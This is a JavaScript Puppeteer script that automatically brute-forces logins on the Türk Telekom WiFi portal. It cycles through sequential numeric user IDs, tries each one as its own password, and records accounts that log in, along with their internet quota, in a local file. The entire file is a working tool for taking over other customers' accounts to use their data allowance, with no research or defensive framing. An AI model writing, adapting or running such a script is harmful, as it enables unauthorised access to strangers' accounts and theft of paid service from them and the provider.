const puppeteer = require("puppeteer");
const fs = require("fs");

var user = 2115236;
var howManyTrys = 300;

var browser = null;
var accountFound = false;
const url = "https://giris.turktelekomwifi.com/#/";

const TTMusteri_Button = "#accordingMenuButton";
const Internet_Button = "#according-menu > button:nth-child(1)";
const InternetGiris_Button = "#adslBtn";

const checkBoxID = 'input[name="termsCheckBox"]';
const userName_InputField = "#adslUsername";
const password_InputField = 'input[name="password"]';
const login_Button = "#loginBtn:not([disabled])";

const exitButton = "a[data-autamation=\"cikis\"]";
const tableContent = "td.alert-link";

async function findInternet(){
    
	const page = await startBrowser(true);

	while (howManyTrys !== 0) {

        if (howManyTrys !== 0) await navigateSite(page);
        if (howManyTrys !== 0) await fillForm(page);	
        if (howManyTrys !== 0) await exitAccount(page);
        if (howManyTrys !== 0) await showQuota(page);
	}
	
    await startBrowser(false);
	
}

async function startBrowser(Start_or_Stop){

    if (Start_or_Stop){
        browser = await puppeteer.launch({
            headless: true,
            defaultViewport: null
        });
    
        const _page = await browser.newPage();
    
        await _page.goto(url,{
            waitUntil: "domcontentloaded"
        });
        return _page;
    }
    else  {
        console.log("Proccess complete\nExiting")
        await browser.close();
    }

}

async function navigateSite(page){
	await page.waitForSelector(TTMusteri_Button);
	await page.click(TTMusteri_Button);

	await page.waitForSelector(Internet_Button);
	await page.click(Internet_Button);

	await page.waitForSelector(InternetGiris_Button);
	await Promise.all([
		page.waitForNavigation(),
		await page.click(InternetGiris_Button)
	])
}

async function fillForm(page){


	await page.waitForSelector(checkBoxID);
	const checkbox = await page.$(checkBoxID);
	var checked = await (await checkbox.getProperty('checked')).jsonValue();

	if (!checked){
		await page.click(checkBoxID);
	}
	
	while (!accountFound && (howManyTrys !== 0)) {

		howManyTrys -= 1;
		user += 1;
        	console.log(user);	

	    // clear input field
		async function clear(page, selector) {
			await page.evaluate(selector => {
			document.querySelector(selector).value = "";
			}, selector);
		}

		await page.waitForSelector(userName_InputField);
		await page.waitForSelector(password_InputField);

		await clear(page, userName_InputField);
		await clear(page, password_InputField);

		await page.type(userName_InputField, user.toString());
		await page.type(password_InputField, user.toString());		

		try {
		    await page.waitForSelector(login_Button,{timeout:15000});
		    await page.click(login_Button);
		} catch (error) {
			console.log("Account found!");
			fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
			accountFound = true;
			user -= 1;
		}
	}
}

async function exitAccount(page){

	try {
		await page.waitForSelector(exitButton,{timeout:5000});
		page.click(exitButton);
	} catch (error) {}

	accountFound = false;
}

async function showQuota(page) {

    try {
        await page.waitForSelector(tableContent);
    	var table = await page.evaluate(async() => {
        let tds = Array.from(document.querySelectorAll("td.alert-link"))
        return tds.map(td => td.innerText)
    });
	console.log(table);
	fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${table}`, err => {});
    } catch (error) {console.log("This account has no internet available\nExiting")}

}

findInternet();